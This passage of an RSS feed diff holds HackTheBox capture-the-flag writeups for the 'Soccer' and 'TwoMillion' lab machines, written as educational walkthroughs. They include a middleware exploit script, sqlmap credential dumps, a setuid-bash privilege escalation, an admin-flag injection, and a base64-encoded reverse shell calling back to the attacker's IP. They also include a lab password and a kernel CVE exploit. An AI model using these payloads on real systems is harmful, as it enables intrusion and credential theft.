+		allow_reuse_address = True
+
+	httpd = _TCPServer(host_port, CustomHandler)
+	httpd.serve_forever()
+
+
+print(&quot;[+] Starting MiddleWare Server&quot;)
+print(&quot;[+] Sending payloads&quot;)
+
+try:
+	middleware_server((&apos;0.0.0.0&apos;,8081))
+except KeyboardInterrupt:
+	pass
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;What this exploit does is redirect requests, let’s run it:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ python3 exploit.py
+[+] Starting MiddleWare Server
+[+] Sending payloads
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Sqlmap&lt;/h3&gt;
+&lt;p&gt;Now, with sqlmap, as we had configured in the Python exploit, we point to our localhost and try to list the databases.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ sqlmap -u &quot;http://127.0.0.1:8081/?id=1&quot; --batch -dbs
+Database: soccer_db
+[1 table]
++----------+
+| accounts |
++----------+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We have the “accounts” table:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ sqlmap -u &quot;http://127.0.0.1:8081/?id=1&quot; --batch -D soccer_db -T accounts -columns
+Database: soccer_db
+Table: accounts
+[4 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| email    | varchar(40) |
+| id       | int         |
+| password | varchar(40) |
+| username | varchar(40) |
++----------+-------------+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We are interested in the “username” and “password” columns.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ sqlmap -u &quot;http://127.0.0.1:8081/?id=1&quot; --batch -D soccer_db -T accounts -C username,password -dump
+Database: soccer_db
+Table: accounts
+[1 entry]
++----------+----------------------+
+| username | password             |
++----------+----------------------+
+| player   | PlayerOfthe********* |
++----------+----------------------+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;SSH Connection&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;❯ ssh player@10.10.11.194
+player@10.10.11.194&apos;s password: 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;Now we would only have to raise the privileges.&lt;/p&gt;
+&lt;p&gt;We list the content of the following path:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;player@soccer:~$ ls -la /usr/local/share/dstat
+total 8
+drwxrwx--- 2 root player 4096 Mar 14 16:21 .
+drwxr-xr-x 6 root root   4096 Nov 17 09:16 ..
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can see that we have write capacity in the “share/dstat” path, where the Plugins are stored.&lt;/p&gt;
+&lt;p&gt;What we are going to do is create a Python file, and then run it as if it were a Plugin, since we have permissions on this path.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;echo &apos;import os;os.system(&quot;chmod u+s /bin/bash&quot;)&apos; &amp;gt; dstat_privesc.py
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;doas -u root /usr/bin/dstat --privesc &amp;amp;&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;bash -p
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Here we have the Root&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;bash-5.0# ls /root/root.txt
+/root/root.txt
+bash-5.0# 
+&lt;/code&gt;&lt;/pre&gt;
+</content:encoded></item><item><title>TwoMillion HTB Writeup</title><link>https://fuwari.vercel.app/posts/twomillion/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/twomillion/</guid><description>Easy Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;First a ping to the victim machine:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; ping -c 1 10.10.11.221                                                           
+PING 10.10.11.221 (10.10.11.221) 56(84) bytes of data.
+64 bytes from 10.10.11.221: icmp_seq=1 ttl=63 time=2162 ms
+
+--- 10.10.11.221 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 2162.481/2162.481/2162.481/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Start your scan with nmap:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; nmap -sS -p- --open --min-rate 2000 -Pn -n 10.10.11.221 -oG scan
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-05 18:44 AST
+Nmap scan report for 10.10.11.221
+Host is up (0.089s latency).
+Not shown: 61140 closed tcp ports (reset), 4393 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 44.46 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; nmap -p22,80 -sVC 10.10.11.221                                  
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-05 18:48 AST
+Nmap scan report for 10.10.11.221 (10.10.11.221)
+Host is up (0.076s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
+|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
+80/tcp open  http    nginx
+|_http-title: Did not follow redirect to http://2million.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.99 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;We add the domain to our /etc/hosts, we see the web page (Port 80).&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;Feroxbuster&lt;/h3&gt;
+&lt;p&gt;We are going to apply fuzzing to see possible directories on the web:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;When investigating each of our results we have 2 interesting directories /register and /js/inviteapi.min.js&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;Generate a Invite Code&lt;/h3&gt;
+&lt;p&gt;Apparently we need an invitation code to access.&lt;/p&gt;
+&lt;p&gt;We look at the other path and see that it is a javascript script:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;find a function that creates an invite code for us&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We see that it makes a POST request to an api in /api/v1/invite/how/to/generate.&lt;/p&gt;
+&lt;p&gt;I am trying to make a request to the API. (/api/v1) but it tells me that it does not exist so I try to generate a code.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; curl -sXPOST http://2million.htb/api/v1/invite/how/to/generate
+{&quot;0&quot;:200,&quot;success&quot;:1,&quot;data&quot;:{&quot;data&quot;:&quot;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr&quot;,&quot;enctype&quot;:&quot;ROT13&quot;},&quot;hint&quot;:&quot;Data is encrypted ... We should probbably check the encryption type in order to decrypt it...&quot;}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Returns a string in ROT13&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; echo &apos;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr&apos; | tr &apos;A-Za-z&apos; &apos;N-ZA-Mn-za-m&apos;
+In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We create our invitation code.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; curl -sXPOST http://2million.htb/api/v1/invite/generate
+{&quot;0&quot;:200,&quot;success&quot;:1,&quot;data&quot;:{&quot;code&quot;:&quot;VE0yRlgtMlkxOVMtR0JPQzEtNTc5TUs=&quot;,&quot;format&quot;:&quot;encoded&quot;}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; echo &quot;VE0yRlgtMlkxOVMtR0JPQzEtNTc5TUs=&quot; | base64 -d                                                                         
+TM2FX-2Y19S-GBOC1-579MK
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now, with the cookie provided to us upon login, we can access more API End Points.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/6.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;See more information with session cookie&lt;/h3&gt;
+&lt;p&gt;Now, with the cookie provided to us upon login, we can access more API End Points.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; curl -s http://2million.htb/api/v1 -b &apos;PHPSESSID=ugpbnr10pk9rjvclhpskh2rsgh&apos; | jq
+{
+  &quot;v1&quot;: {
+    &quot;user&quot;: {
+      &quot;GET&quot;: {
+        &quot;/api/v1&quot;: &quot;Route List&quot;,
+        &quot;/api/v1/invite/how/to/generate&quot;: &quot;Instructions on invite code generation&quot;,
+        &quot;/api/v1/invite/generate&quot;: &quot;Generate invite code&quot;,
+        &quot;/api/v1/invite/verify&quot;: &quot;Verify invite code&quot;,
+        &quot;/api/v1/user/auth&quot;: &quot;Check if user is authenticated&quot;,
+        &quot;/api/v1/user/vpn/generate&quot;: &quot;Generate a new VPN configuration&quot;,
+        &quot;/api/v1/user/vpn/regenerate&quot;: &quot;Regenerate VPN configuration&quot;,
+        &quot;/api/v1/user/vpn/download&quot;: &quot;Download OVPN file&quot;
+      },
+      &quot;POST&quot;: {
+        &quot;/api/v1/user/register&quot;: &quot;Register a new user&quot;,
+        &quot;/api/v1/user/login&quot;: &quot;Login with existing user&quot;
+      }
+    },
+    &quot;admin&quot;: {
+      &quot;GET&quot;: {
+        &quot;/api/v1/admin/auth&quot;: &quot;Check if user is admin&quot;
+      },
+      &quot;POST&quot;: {
+        &quot;/api/v1/admin/vpn/generate&quot;: &quot;Generate VPN for specific user&quot;
+      },
+      &quot;PUT&quot;: {
+        &quot;/api/v1/admin/settings/update&quot;: &quot;Update user settings&quot;
+      }
+    }
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Change my user settings&lt;/h3&gt;
+&lt;p&gt;We change our user settings:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;curl -sXPUT http://2million.htb/api/v1/admin/settings/update -b &apos;PHPSESSID=ugpbnr10pk9rjvclhpskh2rsgh&apos; -H &apos;Content-Type: application/json&apos; -d &apos;{&quot;email&quot;: &quot;mhil4ne@gmail.com&quot;, &quot;is_admin&quot;: 1}&apos; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now that we are admin user, we can inject commands through the username parameter.&lt;/p&gt;
+&lt;h3&gt;RevShell (www-data)&lt;/h3&gt;
+&lt;p&gt;We prepare our revShell and pass it in Base64:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;curl -sXPOST http://2million.htb/api/v1/admin/vpn/generate -b &apos;PHPSESSID=ugpbnr10pk9rjvclhpskh2rsgh&apos; -H &apos;Content-Type: application/json&apos; -d &apos;{&quot;username&quot;:&quot;mhil4ne;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE1MC80NDMgMD4mMQo=| base64 -d | bash&quot;}&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;nc -nlvp 443
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;lt;img src=&quot;img/7.png&quot; alt=&quot;&quot;&amp;gt;&lt;/p&gt;
+&lt;p&gt;find .env:&lt;/p&gt;
+&lt;p&gt;&amp;lt;img src=&quot;img/8.png&quot; alt=&quot;&quot;&amp;gt;&lt;/p&gt;
+&lt;p&gt;Look at the file /etc/passwd:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;admin1000:1000::/home/admin:/bin/bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;admin user credentials&lt;/h3&gt;
+&lt;p&gt;Try the password with this user:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;admin : SuperDuperPass123
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation &amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;h3&gt;CVE-2023-0386&lt;/h3&gt;
+&lt;p&gt;We take it to our attacking machine:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;svn checkout https://github.com/DataDog/security-labs-pocs/trunk/proof-of-concept-exploits/overlayfs-cve-2023-0386
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We compile the file:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Install libfuse-dev&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;gcc poc.c -o poc -D_FILE_OFFSET_BITS=64 -static -lfuse -ldl -lpthread
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;You pass the file to the victim machine:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# From the victim machine
+nc -nlvp 1222 &amp;gt; poc
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;# From the attacking machine
+nc 10.10.11.221 1234 &amp;lt; poc
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now we give it execution permissions:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;chmod +x poc
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We execute it&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;./poc
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;You are now Root.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@2million:~# whoami
+root
+&lt;/code&gt;&lt;/pre&gt;
+</content:encoded></item><item><title>Wifinetic HTB Writeup</title><link>https://fuwari.vercel.app/posts/wifinetic/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/wifinetic/</guid><description>Easy Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded/></item></channel></rss>
